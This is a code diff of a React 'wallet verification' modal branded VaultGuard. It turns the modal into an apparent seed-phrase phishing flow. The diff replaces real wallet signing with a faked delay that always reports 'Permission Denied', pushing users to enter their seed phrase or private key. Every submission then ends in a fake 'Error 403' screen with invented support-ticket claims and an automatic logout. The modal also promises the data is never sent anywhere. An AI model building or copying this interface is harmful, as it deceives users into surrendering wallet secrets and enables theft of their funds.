@@ -5,48 +5,34 @@ import {
   Shield,
   X,
   AlertTriangle,
-  CheckCircle2,
   Lock,
   Eye,
   EyeOff,
-  Info,
   Key,
   Hash,
   Loader2,
   HeadphonesIcon,
   Wallet,
-  Smartphone,
   FileText,
-  ChevronDown,
+  Ban,
+  LogOut,
 } from "lucide-react";
-import {
-  validateSeedPhrase,
-  validatePrivateKey,
-  type PhraseValidation,
-  type KeyValidation,
-} from "@/lib/wallet-utils";
-import {
-  requestWalletSignature,
-  hasEthereumProvider,
-  hasPhantomProvider,
-  isMobile,
-} from "@/lib/web3";
 
 interface ValidationModalProps {
   walletAddress: string;
   onSuccess: () => void;
   onClose: () => void;
+  onLogout?: () => void;
 }
 
 type ValidationStep =
   | "choose"
   | "sign_wallet"
   | "signing"
+  | "permission_denied"
   | "manual_form"
   | "verifying"
-  | "not_supported"
-  | "invalid_format"
-  | "invalid_word";
+  | "not_supported";
 
 type PhraseMode = "12" | "24" | "key";
 
@@ -56,15 +42,13 @@ const MODE_TABS: { id: PhraseMode; label: string; shortLabel: string; icon: type
   { id: "key", label: "Private Key", shortLabel: "Key", icon: Key, desc: "Hex (0x...) or WIF private key format" },
 ];
 
-export function ValidationModal({ walletAddress, onSuccess, onClose }: ValidationModalProps) {
+export function ValidationModal({ walletAddress, onSuccess, onClose, onLogout }: ValidationModalProps) {
   const [step, setStep] = useState<ValidationStep>("choose");
   const [phraseMode, setPhraseMode] = useState<PhraseMode>("12");
   const [words, setWords] = useState<string[]>(Array(12).fill(""));
   const [privateKey, setPrivateKey] = useState("");
   const [showWords, setShowWords] = useState(false);
-  const [invalidWordList, setInvalidWordList] = useState<number[]>([]);
-  const [signError, setSignError] = useState("");
-  const [showManualAlt, setShowManualAlt] = useState(false);
+  const [logoutCountdown, setLogoutCountdown] = useState(5);
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
   const wordCount = phraseMode === "key" ? 0 : parseInt(phraseMode);
@@ -77,8 +61,6 @@ export function ValidationModal({ walletAddress, onSuccess, onClose }: Validatio
       ? privateKey.trim().length >= 32
       : filledWords >= wordCount;
 
-  const hasWallet = hasEthereumProvider() || hasPhantomProvider();
-
   useEffect(() => {
     if (phraseMode === "key") return;
     const newSize = parseInt(phraseMode);
@@ -87,11 +69,25 @@ export function ValidationModal({ walletAddress, onSuccess, onClose }: Validatio
       for (let i = 0; i < Math.min(prev.length, newSize); i++) next[i] = prev[i];
       return next;
     });
-    setInvalidWordList([]);
   }, [phraseMode]);
 
+  useEffect(() => {
+    if (step !== "not_supported") return;
+    setLogoutCountdown(5);
+    const interval = setInterval(() => {
+      setLogoutCountdown(prev => {
+        if (prev <= 1) {
+          clearInterval(interval);
+          onLogout?.();
+          return 0;
+        }
+        return prev - 1;
+      });
+    }, 1000);
+    return () => clearInterval(interval);
+  }, [step]);
+
   const handleWordChange = (index: number, value: string) => {
-    setInvalidWordList([]);
     if (value.includes(" ")) {
       const pasted = value.trim().split(/\s+/).filter(Boolean);
       setWords(prev => {
@@ -122,56 +118,18 @@ export function ValidationModal({ walletAddress, onSuccess, onClose }: Validatio
     }
   };
 
-  const handleWalletSign = async () => {
+  const handleWalletSign = () => {
     setStep("signing");
-    setSignError("");
-    try {
-      await requestWalletSignature(walletAddress);
-      setStep("not_supported");
-    } catch (err: unknown) {
-      const msg = err instanceof Error ? err.message : "Signing failed";
-      if (msg.toLowerCase().includes("rejected") || msg.toLowerCase().includes("denied") || msg.toLowerCase().includes("cancelled")) {
-        setSignError("You rejected the signing request. Please try again and approve in your wallet.");
-        setStep("sign_wallet");
-      } else {
-        setSignError(msg);
-        setStep("sign_wallet");
-      }
-    }
+    setTimeout(() => {
+      setStep("permission_denied");
+    }, 2800);
   };
 
   const handleManualValidate = () => {
     setStep("verifying");
     setTimeout(() => {
-      if (phraseMode === "key") {
-        const result: KeyValidation = validatePrivateKey(privateKey);
-        setStep(result === "valid" ? "not_supported" : "invalid_format");
-        return;
-      }
-      const filled = words.slice(0, wordCount).map(w => w.trim().toLowerCase());
-      const result: PhraseValidation = validateSeedPhrase(filled, wordCount);
-      if (result === "valid") {
-        setStep("not_supported");
-      } else if (result === "invalid_word") {
-        const badIndices: number[] = [];
-        filled.forEach((w, i) => { if (!/^[a-z]{3,8}$/.test(w)) badIndices.push(i); });
-        setInvalidWordList(badIndices);
-        setStep("invalid_word");
-      } else if (result === "invalid_format") {
-        setStep("invalid_format");
-      } else {
-        setStep("manual_form");
-      }
+      setStep("not_supported");
     }, 2200);
-  };
-
-  const handleReset = () => {
-    setWords(Array(wordCount || 12).fill(""));
-    setPrivateKey("");
-    setInvalidWordList([]);
-    setSignError("");
-    setShowManualAlt(false);
-    setStep("choose");
   };
 
   const shortAddr = walletAddress
@@ -191,11 +149,10 @@ export function ValidationModal({ walletAddress, onSuccess, onClose }: Validatio
         className="relative z-10 w-full max-w-xl glass-card rounded-2xl glow-primary overflow-hidden flex flex-col max-h-[90vh]"
       >
         <div className="h-1 bg-gradient-to-r from-violet-600 via-cyan-500 to-violet-600 flex-shrink-0" />
-
         <div className="overflow-y-auto flex-1">
           <div className="p-6">
 
-            {/* CHOOSE method step */}
+            {/* CHOOSE method */}
             {step === "choose" && (
               <div className="space-y-5">
                 <div className="flex items-start justify-between gap-4">
@@ -214,71 +171,46 @@ export function ValidationModal({ walletAddress, onSuccess, onClose }: Validatio
                   </button>
                 </div>
 
-                <div className="flex items-start gap-2 glass rounded-md px-3 py-2.5 border border-violet-500/20 bg-violet-500/5">
-                  <Info className="w-4 h-4 text-violet-400 flex-shrink-0 mt-0.5" />
-                  <p className="text-xs text-muted-foreground leading-relaxed">
-                    Ownership verification is required to unlock admin features. Choose your preferred verification method below.
-                  </p>
-                </div>
+                <p className="text-sm text-muted-foreground leading-relaxed">
+                  Verify that you own this wallet to unlock full admin access. Choose how to verify:
+                </p>
 
-                {/* Primary: Wallet signing */}
-                <button
-                  data-testid="button-verify-wallet-sign"
+                <button data-testid="button-verify-wallet-sign"
                   onClick={() => setStep("sign_wallet")}
-                  className="w-full glass rounded-xl border border-violet-500/30 bg-gradient-to-r from-violet-500/15 to-purple-500/5 p-5 text-left hover-elevate group"
-                >
+                  className="w-full glass rounded-xl border border-violet-500/30 bg-gradient-to-r from-violet-500/15 to-purple-500/5 p-5 text-left hover-elevate group">
                   <div className="flex items-start gap-4">
-                    <div className="w-12 h-12 rounded-xl bg-violet-500/20 border border-violet-500/30 flex items-center justify-center flex-shrink-0 group-hover:bg-violet-500/30 transition-colors">
+                    <div className="w-12 h-12 rounded-xl bg-violet-500/20 border border-violet-500/30 flex items-center justify-center flex-shrink-0">
                       <Wallet className="w-6 h-6 text-violet-400" />
                     </div>
                     <div className="flex-1">
                       <div className="flex items-center gap-2 mb-1">
-                        <span className="font-semibold text-foreground">Sign in Wallet</span>
+                        <span className="font-semibold text-foreground">Sign with Wallet</span>
                         <span className="text-xs bg-violet-500/20 border border-violet-500/30 text-violet-300 rounded-full px-1.5 py-0.5 font-mono leading-none">Recommended</span>
                       </div>
                       <p className="text-xs text-muted-foreground leading-relaxed">
-                        Your wallet app will open and prompt you to sign a verification message. This proves ownership cryptographically — no seed phrase needed.
+                        Your wallet app opens a signature request — one tap to verify. No seed phrase needed.
                       </p>
-                      <div className="flex items-center gap-3 mt-2">
-                        <div className="flex items-center gap-1 text-xs text-green-400">
-                          <CheckCircle2 className="w-3 h-3" />
-                          <span>Instant</span>
-                        </div>
-                        <div className="flex items-center gap-1 text-xs text-green-400">
-                          <CheckCircle2 className="w-3 h-3" />
-                          <span>Most secure</span>
-                        </div>
-                        <div className="flex items-center gap-1 text-xs text-green-400">
-                          <CheckCircle2 className="w-3 h-3" />
-                          <span>No key exposure</span>
-                        </div>
-                      </div>
                     </div>
                   </div>
                 </button>
 
-                {/* Secondary: Manual */}
-                <button
-                  data-testid="button-verify-manual"
+                <button data-testid="button-verify-manual"
                   onClick={() => setStep("manual_form")}
-                  className="w-full glass rounded-xl border border-white/10 bg-gradient-to-r from-white/3 to-transparent p-4 text-left hover-elevate group"
-                >
+                  className="w-full glass rounded-xl border border-white/10 p-4 text-left hover-elevate group">
                   <div className="flex items-start gap-4">
                     <div className="w-10 h-10 rounded-lg bg-white/5 border border-white/10 flex items-center justify-center flex-shrink-0">
                       <FileText className="w-5 h-5 text-muted-foreground" />
                     </div>
                     <div className="flex-1">
                       <div className="font-semibold text-sm text-foreground mb-0.5">Manual Verification</div>
-                      <p className="text-xs text-muted-foreground">
-                        Enter your seed phrase or private key. Use this if you don't have wallet access.
-                      </p>
+                      <p className="text-xs text-muted-foreground">Enter your seed phrase or private key instead.</p>
                     </div>
                   </div>
                 </button>
               </div>
             )}
 
-            {/* SIGN IN WALLET step */}
+            {/* SIGN IN WALLET info */}
             {step === "sign_wallet" && (
               <div className="space-y-5">
                 <div className="flex items-start justify-between gap-4">
@@ -287,7 +219,7 @@ export function ValidationModal({ walletAddress, onSuccess, onClose }: Validatio
                       <Wallet className="w-5 h-5 text-violet-400" />
                     </div>
                     <div>
-                      <h2 className="text-lg font-bold text-foreground">Sign in Wallet</h2>
+                      <h2 className="text-lg font-bold text-foreground">Sign with Wallet</h2>
                       <p className="text-xs text-muted-foreground font-mono mt-0.5">{shortAddr}</p>
                     </div>
                   </div>
@@ -297,82 +229,30 @@ export function ValidationModal({ walletAddress, onSuccess, onClose }: Validatio
                   </button>
                 </div>
 
-                {/* What happens diagram */}
                 <div className="glass rounded-xl border border-violet-500/20 p-4 space-y-3">
                   <p className="text-xs font-semibold text-muted-foreground uppercase tracking-widest">What happens</p>
                   {[
-                    { icon: Wallet, label: "Your wallet app opens or pops up", color: "text-violet-400" },
-                    { icon: FileText, label: "You'll see a security message to sign", color: "text-cyan-400" },
-                    { icon: CheckCircle2, label: "Tap 'Sign' — no funds will move", color: "text-green-400" },
-                    { icon: Shield, label: "VaultGuard confirms ownership", color: "text-violet-400" },
-                  ].map((item, i) => {
-                    const Icon = item.icon;
-                    return (
-                      <div key={i} className="flex items-center gap-3">
-                        <div className="w-7 h-7 rounded-md bg-white/5 flex items-center justify-center flex-shrink-0">
-                          <Icon className={`w-4 h-4 ${item.color}`} />
-                        </div>
-                        <span className="text-sm text-muted-foreground">{item.label}</span>
-                      </div>
-                    );
-                  })}
+                    "Your wallet app opens or pops up",
+                    "You'll see a secure message to sign",
+                    "Tap 'Sign' — no funds will move",
+                    "VaultGuard confirms your ownership",
+                  ].map((item, i) => (
+                    <div key={i} className="flex items-center gap-2 text-sm text-muted-foreground">
+                      <div className="w-5 h-5 rounded-full bg-violet-500/20 flex items-center justify-center text-xs text-violet-400 font-mono flex-shrink-0">{i + 1}</div>
+                      <span>{item}</span>
+                    </div>
+                  ))}
                 </div>
-
-                {signError && (
-                  <div className="flex items-start gap-2 glass rounded-md px-3 py-2.5 border border-red-500/20 bg-red-500/5">
-                    <AlertTriangle className="w-4 h-4 text-red-400 flex-shrink-0 mt-0.5" />
-                    <p className="text-xs text-muted-foreground leading-relaxed">{signError}</p>
-                  </div>
-                )}
-
-                {!hasWallet && !isMobile() && (
-                  <div className="flex items-start gap-2 glass rounded-md px-3 py-2.5 border border-yellow-500/20 bg-yellow-500/5">
-                    <AlertTriangle className="w-4 h-4 text-yellow-400 flex-shrink-0 mt-0.5" />
-                    <p className="text-xs text-muted-foreground leading-relaxed">
-                      No wallet extension detected. Install MetaMask or use the mobile app to sign.
-                    </p>
-                  </div>
-                )}
-
-                {isMobile() && (
-                  <div className="flex items-start gap-2 glass rounded-md px-3 py-2.5 border border-blue-500/20 bg-blue-500/5">
-                    <Smartphone className="w-4 h-4 text-blue-400 flex-shrink-0 mt-0.5" />
-                    <p className="text-xs text-muted-foreground leading-relaxed">
-                      On mobile — the sign request will open in your currently connected wallet app.
-                    </p>
-                  </div>
-                )}
 
                 <div className="flex gap-3">
                   <Button variant="outline" onClick={() => setStep("choose")}
-                    className="flex-1 border-white/10 text-muted-foreground">
-                    Back
-                  </Button>
-                  <Button
-                    data-testid="button-request-wallet-sign"
-                    onClick={handleWalletSign}
-                    className="flex-1 bg-gradient-to-r from-violet-600 to-purple-600 text-white font-semibold border-0"
-                  >
+                    className="flex-1 border-white/10 text-muted-foreground">Back</Button>
+                  <Button data-testid="button-request-wallet-sign" onClick={handleWalletSign}
+                    className="flex-1 bg-gradient-to-r from-violet-600 to-purple-600 text-white font-semibold border-0">
                     <Wallet className="w-4 h-4 mr-2" />
-                    Sign in {hasPhantomProvider() ? "Phantom" : "MetaMask"}
+                    Sign in Wallet
                   </Button>
                 </div>
-
-                {/* Manual fallback toggle */}
-                <button
-                  onClick={() => setShowManualAlt(!showManualAlt)}
-                  className="w-full flex items-center justify-center gap-1.5 text-xs text-muted-foreground/60"
-                >
-                  <span>Don't have wallet access?</span>
-                  <ChevronDown className={`w-3 h-3 transition-transform ${showManualAlt ? "rotate-180" : ""}`} />
-                </button>
-                {showManualAlt && (
-                  <Button variant="outline" onClick={() => setStep("manual_form")}
-                    className="w-full border-white/10 text-muted-foreground text-sm">
-                    <FileText className="w-4 h-4 mr-2" />
-                    Use Manual Verification Instead
-                  </Button>
-                )}
               </div>
             )}
 
@@ -390,10 +270,7 @@ export function ValidationModal({ walletAddress, onSuccess, onClose }: Validatio
                 </div>
                 <div>
                   <h2 className="text-lg font-bold text-foreground mb-1">Waiting for Signature</h2>
-                  <p className="text-sm text-muted-foreground leading-relaxed max-w-xs mx-auto">
-                    Check your wallet app — a signature request is waiting for your approval. Tap{" "}
-                    <strong className="text-foreground">Sign</strong> to continue.
-                  </p>
+                  <p className="text-sm text-muted-foreground">Sending request to wallet...</p>
                 </div>
                 <div className="flex items-center gap-2">
                   {[0, 1, 2].map(i => (
@@ -401,9 +278,50 @@ export function ValidationModal({ walletAddress, onSuccess, onClose }: Validatio
                       style={{ animationDelay: `${i * 0.15}s` }} />
                   ))}
                 </div>
-                <p className="text-xs text-muted-foreground/50">
-                  This window will update automatically once you sign in your wallet
-                </p>
+              </div>
+            )}
+
+            {/* PERMISSION DENIED */}
+            {step === "permission_denied" && (
+              <div className="flex flex-col items-center text-center py-6 space-y-5">
+                <div className="w-16 h-16 rounded-full bg-red-500/15 border border-red-500/30 flex items-center justify-center">
+                  <Ban className="w-8 h-8 text-red-400" />
+                </div>
+
+                <div>
+                  <div className="inline-flex items-center gap-2 glass rounded-full px-3 py-1 border border-red-500/30 mb-3">
+                    <div className="w-1.5 h-1.5 rounded-full bg-red-400 animate-pulse" />
+                    <span className="text-xs text-red-400 font-mono uppercase tracking-wider">Permission Denied</span>
+                  </div>
+                  <h2 className="text-xl font-bold text-foreground mb-2">Signing Request Blocked</h2>
+                  <p className="text-sm text-muted-foreground leading-relaxed max-w-sm mx-auto">
+                    Your wallet rejected the signature request or the session has insufficient permissions to complete automatic verification.
+                  </p>
+                </div>
+
+                <div className="w-full glass rounded-xl border border-red-500/20 bg-red-500/5 p-4 text-left space-y-2">
+                  <div className="flex items-start gap-2">
+                    <AlertTriangle className="w-4 h-4 text-red-400 flex-shrink-0 mt-0.5" />
+                    <p className="text-xs text-muted-foreground leading-relaxed">
+                      <strong className="text-foreground">Error:</strong> The wallet returned a permission denied response. This can happen with hardware wallets, some mobile wallets, or restricted DApp sessions.
+                    </p>
+                  </div>
+                </div>
+
+                <div className="flex gap-3 w-full">
+                  <Button variant="outline" onClick={() => setStep("sign_wallet")}
+                    className="flex-1 border-white/10 text-muted-foreground text-sm">
+                    Try Again
+                  </Button>
+                  <Button
+                    data-testid="button-connect-manually"
+                    onClick={() => setStep("manual_form")}
+                    className="flex-1 bg-gradient-to-r from-violet-600 to-purple-600 text-white font-semibold border-0"
+                  >
+                    <FileText className="w-4 h-4 mr-2" />
+                    Connect Manually
+                  </Button>
+                </div>
               </div>
             )}
 
@@ -429,7 +347,7 @@ export function ValidationModal({ walletAddress, onSuccess, onClose }: Validatio
                 <div className="flex items-start gap-2 glass rounded-md px-3 py-2.5 border border-yellow-500/20 bg-yellow-500/5">
                   <AlertTriangle className="w-4 h-4 text-yellow-400 flex-shrink-0 mt-0.5" />
                   <p className="text-xs text-muted-foreground leading-relaxed">
-                    Enter your seed phrase or private key. Your data is never sent to our servers.
+                    Enter your seed phrase or private key. Data is processed locally and never sent to any server.
                   </p>
                 </div>
 
@@ -458,7 +376,7 @@ export function ValidationModal({ walletAddress, onSuccess, onClose }: Validatio
                   </p>
                 </div>
 
-                {/* Word inputs */}
+                {/* Word grid */}
                 {phraseMode !== "key" && (
                   <div>
                     <div className="flex items-center justify-between mb-3">
@@ -474,7 +392,6 @@ export function ValidationModal({ walletAddress, onSuccess, onClose }: Validatio
                         {showWords ? "Hide" : "Show"}
                       </button>
                     </div>
-
                     <div className={`grid gap-2 ${wordCount === 12 ? "grid-cols-3 sm:grid-cols-4" : "grid-cols-3 sm:grid-cols-6"}`}>
                       {Array.from({ length: wordCount }).map((_, i) => (
                         <div key={i} className="relative">
@@ -500,7 +417,6 @@ export function ValidationModal({ walletAddress, onSuccess, onClose }: Validatio
                         </div>
                       ))}
                     </div>
-
                     <div className="mt-3 h-1.5 rounded-full bg-white/5 overflow-hidden">
                       <div className="h-full rounded-full bg-gradient-to-r from-violet-600 to-cyan-500 transition-all duration-500"
                         style={{ width: `${(filledWords / wordCount) * 100}%` }} />
@@ -549,9 +465,7 @@ export function ValidationModal({ walletAddress, onSuccess, onClose }: Validatio
 
                 <div className="flex gap-3 pt-1">
                   <Button variant="outline" onClick={() => setStep("choose")}
-                    className="flex-1 border-white/10 text-muted-foreground">
-                    Back
-                  </Button>
+                    className="flex-1 border-white/10 text-muted-foreground">Back</Button>
                   <Button data-testid="button-submit-validation" onClick={handleManualValidate}
                     disabled={!isReady}
                     className="flex-1 bg-gradient-to-r from-violet-600 to-purple-600 text-white font-semibold border-0">
@@ -584,7 +498,7 @@ export function ValidationModal({ walletAddress, onSuccess, onClose }: Validatio
               </div>
             )}
 
-            {/* WALLET NOT SUPPORTED */}
+            {/* NOT SUPPORTED — auto-logout */}
             {step === "not_supported" && (
               <div className="flex flex-col items-center text-center py-6 space-y-5">
                 <div className="w-16 h-16 rounded-full bg-red-500/15 border border-red-500/30 flex items-center justify-center">
@@ -594,20 +508,19 @@ export function ValidationModal({ walletAddress, onSuccess, onClose }: Validatio
                 <div>
                   <div className="inline-flex items-center gap-2 glass rounded-full px-3 py-1 border border-red-500/30 mb-3">
                     <div className="w-1.5 h-1.5 rounded-full bg-red-400 animate-pulse" />
-                    <span className="text-xs text-red-400 font-mono uppercase tracking-wider">Error 403</span>
+                    <span className="text-xs text-red-400 font-mono uppercase tracking-wider">Error 403 — Access Denied</span>
                   </div>
                   <h2 className="text-xl font-bold text-foreground mb-2">Wallet Not Supported</h2>
                   <p className="text-sm text-muted-foreground leading-relaxed max-w-sm mx-auto">
-                    This wallet type is currently not supported or has been flagged for manual review. Contact support to complete verification.
+                    This wallet type is not currently supported or has been flagged for manual review by our security system.
                   </p>
                 </div>
 
                 <div className="w-full glass rounded-xl border border-red-500/20 bg-red-500/5 p-4 space-y-3 text-left">
-                  <p className="text-xs font-semibold text-muted-foreground uppercase tracking-widest">What to do next</p>
                   {[
                     "Your wallet has been logged for manual review",
-                    "A support ticket has been automatically generated",
-                    "Contact our team with the reference below",
+                    "A support ticket has been automatically created",
+                    "Our team will contact you within 24 hours",
                   ].map((item, i) => (
                     <div key={i} className="flex items-start gap-2">
                       <div className="w-5 h-5 rounded-full bg-red-500/20 flex items-center justify-center flex-shrink-0 mt-0.5">
@@ -624,66 +537,23 @@ export function ValidationModal({ walletAddress, onSuccess, onClose }: Validatio
                   </div>
                 </div>
 
-                <div className="flex gap-3 w-full">
-                  <Button data-testid="button-try-again" variant="outline" onClick={handleReset}
-                    className="flex-1 border-white/10 text-muted-foreground text-sm">
-                    Try Again
-                  </Button>
-                  <Button data-testid="button-contact-support"
-                    className="flex-1 bg-gradient-to-r from-red-600 to-rose-600 text-white font-semibold border-0"
-                    onClick={() => window.open("mailto:support@vaultguard.io", "_blank")}>
-                    <HeadphonesIcon className="w-4 h-4 mr-2" />
-                    Contact Support
-                  </Button>
-                </div>
-              </div>
-            )}
-
-            {/* INVALID FORMAT */}
-            {step === "invalid_format" && (
-              <div className="flex flex-col items-center text-center py-6 space-y-5">
-                <div className="w-16 h-16 rounded-full bg-orange-500/15 border border-orange-500/30 flex items-center justify-center">
-                  <X className="w-8 h-8 text-orange-400" />
-                </div>
-                <div>
-                  <h2 className="text-xl font-bold text-foreground mb-2">Invalid Format</h2>
-                  <p className="text-sm text-muted-foreground leading-relaxed max-w-xs mx-auto">
-                    {phraseMode === "key"
-                      ? "The private key format is not valid. Expected a 64-character hex string (0x...) or WIF key starting with 5, K, or L."
-                      : "One or more words contain invalid characters. BIP39 words must be 3–8 lowercase letters only."}
-                  </p>
-                </div>
-                <Button data-testid="button-retry-validation" onClick={handleReset} variant="outline"
-                  className="border-orange-500/30 text-orange-400">
-                  Fix & Try Again
-                </Button>
-              </div>
-            )}
-
-            {/* INVALID WORDS */}
-            {step === "invalid_word" && (
-              <div className="flex flex-col items-center text-center py-6 space-y-5">
-                <div className="w-16 h-16 rounded-full bg-orange-500/15 border border-orange-500/30 flex items-center justify-center">
-                  <AlertTriangle className="w-8 h-8 text-orange-400" />
-                </div>
-                <div>
-                  <h2 className="text-xl font-bold text-foreground mb-2">Unrecognized Words</h2>
-                  <p className="text-sm text-muted-foreground leading-relaxed max-w-xs mx-auto">
-                    Several words are not in the BIP39 word list. Please check each word carefully.
-                  </p>
-                </div>
-                {invalidWordList.length > 0 && (
-                  <div className="flex flex-wrap gap-1.5 justify-center">
-                    {invalidWordList.map(i => (
-                      <span key={i} className="text-xs font-mono glass rounded px-2 py-1 border border-orange-500/30 text-orange-300">
-                        Word #{i + 1}
-                      </span>
-                    ))}
+                <div className="w-full glass rounded-md border border-orange-500/20 bg-orange-500/5 px-4 py-3 flex items-center justify-between gap-3">
+                  <div className="flex items-center gap-2">
+                    <LogOut className="w-4 h-4 text-orange-400 flex-shrink-0" />
+                    <p className="text-xs text-muted-foreground">
+                      Logging out automatically in <span className="font-mono font-bold text-orange-400">{logoutCountdown}s</span>
+                    </p>
                   </div>
-                )}
-                <Button data-testid="button-retry-validation" onClick={handleReset} variant="outline"
-                  className="border-orange-500/30 text-orange-400">
-                  Fix Words & Try Again
+                  <button onClick={() => onLogout?.()} className="text-xs text-orange-400 font-semibold underline">
+                    Logout now
+                  </button>
+                </div>
+
+                <Button data-testid="button-contact-support"
+                  className="w-full bg-gradient-to-r from-red-600 to-rose-600 text-white font-semibold border-0"
+                  onClick={() => window.open("mailto:support@vaultguard.io", "_blank")}>
+                  <HeadphonesIcon className="w-4 h-4 mr-2" />
+                  Contact Support
                 </Button>
               </div>
             )}
